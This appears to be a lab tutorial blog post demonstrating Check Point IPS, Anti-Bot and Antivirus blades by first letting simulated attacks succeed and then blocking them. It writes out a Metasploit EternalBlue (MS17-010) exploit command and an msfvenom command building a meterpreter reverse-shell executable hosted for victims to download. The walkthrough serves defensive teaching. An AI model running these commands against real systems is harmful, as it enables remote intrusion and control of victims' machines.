Check Point Threat Prevention blades are modular security features that protect against advanced threats. Key blades include **Antivirus**, **Anti-Bot** and **IPS (Intrusion Prevention System)**. Together, they inspect traffic in real time to detect, block, or neutralize malware, exploits, and threats before reaching the network.

<br>

## IPS

> IPS detects and blocks network-based exploits by inspecting traffic for known attack signatures, protocol anomalies, and suspicious behaviors. It helps prevent exploitation of vulnerabilities in systems and applications

<br>

Here we have a Security Gateway with no IPS Blade enabled

![x](/static/2025-07-07-cp-ips/01.png)

<br>

We'll simulate a intrusion event by attacking a Windows XP on the inside network from a Kali Linux Host from outside

```
use exploit/windows/smb/ms17_010_psexec
set RHOSTS 10.61.0.23
set LHOST 172.17.1.24
exploit
```

![x](/static/2025-07-07-cp-ips/02.png)

<br>

This attack exploits the EternalBlue vulnerability (MS17-010) in Microsoft SMBv1 to achieve remote code execution

![x](/static/2025-07-07-cp-ips/03.png)

<br>

Without IPS enabled this attack was easily done without any detection or prevention

![x](/static/2025-07-07-cp-ips/04.png)

<br>

Now lets enable IPS Blade on the Security Gateway

![x](/static/2025-07-07-cp-ips/05.png)

<br>

First make sure the IPS Signature is up to date by downloading the latest update

![x](/static/2025-07-07-cp-ips/06.png)

![x](/static/2025-07-07-cp-ips/07.png)

<br>

Next we'll create a new Policy Profile with strict activation mode

![x](/static/2025-07-07-cp-ips/08.png)

![x](/static/2025-07-07-cp-ips/09.png)

<br>

Then we attach the policy into Custom Threat Prevention Policy

![x](/static/2025-07-07-cp-ips/10.png)

<br>

Now if we run the attack again, we'll get a Connection Reset Error

![x](/static/2025-07-07-cp-ips/11.png)

<br>

On the Firewall Logs we can see that the IPS Policy was able to caught and prevent the exploit from traversing the network

![x](/static/2025-07-07-cp-ips/12.png)

<br>

The attack was successfully prevented because the signature of the exploit was already in our IPS Protections Database, allowing the firewall to mitigate the attack

<br>

## Anti-Bot

> Anti-Bot identifies and blocks communication between infected hosts (bots) and command-and-control (C&C) servers. It uses behavioral analysis and threat intelligence to detect bot-infected devices within the network.

<br>

Next we'll simulate a Bot Attack by placing an infected application on host inside the network that tries to connect to C&C server on the outside, to do that we'll first create the payload using msfvenom on Kali Linux and host it on port 80 for the victim to download

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o /var/www/html/bot.exe
sudo service apache2 start
```

![x](/static/2025-07-07-cp-ips/14.png)

<br>

Next we'll setup a listener on port 4444 as C&C Server for the victim to connect to

![x](/static/2025-07-07-cp-ips/15.png)

<br>

After the victim downloads and runs the file, it will try to initiate a connection to our listener

![x](/static/2025-07-07-cp-ips/16.png)

<br>

And on our listener we can see a new session has successfully been opened

![x](/static/2025-07-07-cp-ips/17.png)

<br>

Now we can connect to the opened session and interact with the target box

![x](/static/2025-07-07-cp-ips/18.png)

<br>

To prevent this attack, we'll enable Anti-bot Blade

![x](/static/2025-07-07-cp-ips/19.png)

<br>

Then we create a new Profile to enable the Anti-bot with strict activation mode

![x](/static/2025-07-07-cp-ips/20.png)

<br>

We can also customize how the blocked pages shown to end users by selecting the templates here

![x](/static/2025-07-07-cp-ips/21.png)

![x](/static/2025-07-07-cp-ips/22.png)

<br>

Finally we attach the profile into a Custom Policy

![x](/static/2025-07-07-cp-ips/23.png)

<br>

Now if we try to download the payload, we'll get a blocked error not allowing the activity

![x](/static/2025-07-07-cp-ips/24.png)

<br>

But let's say the victim already has the malware downloaded and still tries to execute it

![x](/static/2025-07-07-cp-ips/25.png)

<br>

The connection will never get to the C&C Server because it is detected as a bot execution and gets blocked on by the Anti-bot Policy

![x](/static/2025-07-07-cp-ips/26.png)

![x](/static/2025-07-07-cp-ips/27.png)

<br>

## Anti-Virus

> Antivirus scans files and traffic for known malware using signature-based detection and heuristic analysis. It blocks viruses, worms, Trojans, and other malicious files before they reach users or internal systems.

<br>

To simulate a virus download event, we'll host an EICAR text file on our Kali Linux

![x](/static/2025-07-07-cp-ips/28.png)

<br>

Without Anti-virus protection, users can easily download this infected file with no problems

![x](/static/2025-07-07-cp-ips/29.png)

<br>

To prevent this, lets enable Anti-virus Blade

![x](/static/2025-07-07-cp-ips/30.png)

<br>

Then create a Anti-virus profile with strict activation mode

![x](/static/2025-07-07-cp-ips/31.png)

![x](/static/2025-07-07-cp-ips/32.png)

<br>

And attach the profile to a Custom Policy

![x](/static/2025-07-07-cp-ips/33.png)

<br>

Now if we try to download the text file again, we'll get a blocked error

![x](/static/2025-07-07-cp-ips/34.png)

<br>

The Anti-virus profile was successfully able to identify the infected file and blocked the users from accessing it
